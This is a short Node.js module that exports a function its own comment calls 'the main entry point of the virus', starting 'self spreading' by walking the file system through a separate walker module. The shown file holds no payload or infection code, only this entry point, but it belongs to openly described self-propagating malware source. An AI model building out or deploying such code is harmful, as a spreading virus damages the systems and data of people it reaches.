/* ======================================================== *
 * > Packages
 * ======================================================== */
var walker = require('./walker');


/* ======================================================== *
 * > Spreading Interface
 * ======================================================== */
/**
 * Starts the self spreading - The main entry point of the virus
 * 
 * @return void
 */
exports.startSpreading = function(){
    walker.walkFileSystem();
}